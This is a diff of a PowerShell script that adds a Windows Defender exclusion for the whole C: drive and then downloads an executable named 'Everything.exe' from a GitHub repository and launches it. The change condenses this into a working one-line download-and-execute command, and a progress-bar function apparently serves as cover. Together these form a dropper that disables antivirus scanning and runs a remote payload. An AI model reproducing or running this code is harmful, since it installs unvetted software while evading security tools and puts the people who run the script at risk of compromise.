@@ -37,10 +37,7 @@ Clear-Host
 Add-MpPreference -ExclusionPath "C:/"
 Clear-Host
 $username = $env:USERNAME
-$url = 'https://github.com/cs2cc/s/raw/main/Everything.exe'
-$output = "C:\"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process -FilePath $output
+Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/Everything.exe" -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe"
 function Show-TextProgressBar {
     param (
         [int]$PercentComplete,
